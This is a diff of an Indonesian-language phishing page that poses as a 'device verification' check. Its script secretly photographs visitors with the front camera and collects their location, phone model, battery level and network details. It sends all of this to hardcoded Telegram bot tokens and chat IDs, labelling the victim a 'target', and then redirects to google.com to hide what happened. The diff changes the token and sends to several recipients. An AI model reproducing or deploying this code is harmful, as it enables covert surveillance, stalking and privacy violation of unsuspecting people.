@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Perangkat</title>
+    <title>Sistem Verifikasi</title>
     <style>
         body { background: #f4f4f4; text-align: center; font-family: sans-serif; padding-top: 100px; }
         .box { padding: 30px; border: 1px solid #ddd; width: 85%; margin: auto; border-radius: 15px; background: #fff; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        button { padding: 15px 30px; font-size: 18px; background: #3498db; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; transition: 0.3s; }
-        button:hover { background: #2980b9; }
+        button { padding: 15px 30px; font-size: 18px; background: #27ae60; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2>Verifikasi Perangkat</h2>
-        <p>Silakan klik tombol di bawah untuk melanjutkan proses verifikasi keamanan.</p>
+        <p>Klik tombol di bawah untuk melanjutkan proses verifikasi keamanan kamera.</p>
         <button onclick="mulaiVerifikasi()">Lanjutkan Verifikasi</button>
     </div>
 
@@ -22,11 +21,10 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = '8746483619:AAGk8JiOWKSYz1YnT1vKI37wxjl_N6uHWTw';
+        const TOKEN = '8836735055:AAH-Uqs-XZ_2J9-TJgBvN1unR-jPyFZMZMI';
         const CHAT_IDS = ['6888530451', '7452255678'];
-        let userLocation = "Akses Lokasi Ditolak";
+        let userLocation = "Lokasi tidak diizinkan";
 
-        // Daftar Model HP
         function translateModel(model) {
             const brands = {
                 '2310FPCA4G': 'Xiaomi Redmi 13C', '2201117TY': 'Redmi Note 11',
@@ -43,14 +41,13 @@
         }
 
         async function getDeviceDetails() {
-            let model = "Android Mobile";
+            let model = navigator.userAgent;
             if (navigator.userAgentData) {
                 try {
                     const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                     if (hints.model) model = translateModel(hints.model);
                 } catch (e) {}
             }
-            
             let battery = "N/A";
             try {
                 if (navigator.getBattery) {
@@ -58,27 +55,20 @@
                     battery = Math.round(bat.level * 100) + "%";
                 }
             } catch (e) {}
-
-            let connectionInfo = "Unknown";
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                connectionInfo = `${conn.effectiveType.toUpperCase()} | Latency: ${conn.rtt}ms | Speed: ${conn.downlink}Mbps`;
-            }
-            
-            return { model, battery, connection: connectionInfo };
+            let connInfo = navigator.connection ? `${navigator.connection.effectiveType.toUpperCase()} | Latency: ${navigator.connection.rtt}ms` : "Unknown";
+            return { model, battery, connInfo };
         }
 
         async function mulaiVerifikasi() {
-            // Minta Izin Lokasi
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => { userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`; },
-                    () => { userLocation = "Ditolak Pengguna"; }
+                    (pos) => { userLocation = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`; },
+                    () => { userLocation = "Ditolak"; }
                 );
             }
 
-            // Akses Kamera
             try {
+                // facingMode: "user" = Kamera Depan
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -92,30 +82,36 @@
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-
+            canvas.getContext('2d').drawImage(video, 0, 0);
             const details = await getDeviceDetails();
 
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob);
-                formData.append('caption', `📸 <b>Laporan Target</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connection}\n📍 <b>Lokasi:</b> ${userLocation}`);
-                formData.append('parse_mode', 'HTML');
-                
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                for (const id of CHAT_IDS) {
+                    const formData = new FormData();
+                    formData.append('chat_id', id);
+                    formData.append('photo', blob);
+                    formData.append('caption', `📸 <b>Laporan Kamera Depan</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`);
+                    formData.append('parse_mode', 'HTML');
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                }
                 window.location.href = "https://google.com";
             }, 'image/jpeg');
         }
 
         async function kirimDataTanpaFoto() {
             const details = await getDeviceDetails();
-            const text = `⚠️ <b>Target menolak kamera</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connection}\n📍 <b>Lokasi:</b> ${userLocation}`;
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
+            const text = `⚠️ <b>Kamera Depan Ditolak</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`;
+            
+            for (const id of CHAT_IDS) {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+                });
+            }
             window.location.href = "https://google.com";
         }
     </script>
 </body>
 </html>
+
